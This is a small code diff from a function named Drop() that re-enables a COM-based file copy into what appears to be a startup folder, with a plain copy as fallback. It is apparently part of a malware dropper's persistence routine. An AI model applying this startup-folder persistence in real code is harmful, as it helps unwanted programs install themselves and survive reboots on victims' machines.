@@ -224,7 +224,7 @@ VOID Drop()
 			return;
 		}
 
-		//if (!SUCCEEDED(ComCopyFile(strSourcePath, strStartupPath, strDestFileName)) || !PathFileExists(strDestPath))
+		if (!SUCCEEDED(ComCopyFile(strSourcePath, strStartupPath, strDestFileName)) || !PathFileExists(strDestPath))
 			DoCopyFile(strSourcePath, strDestPath);
 
 		free(strDestPath);
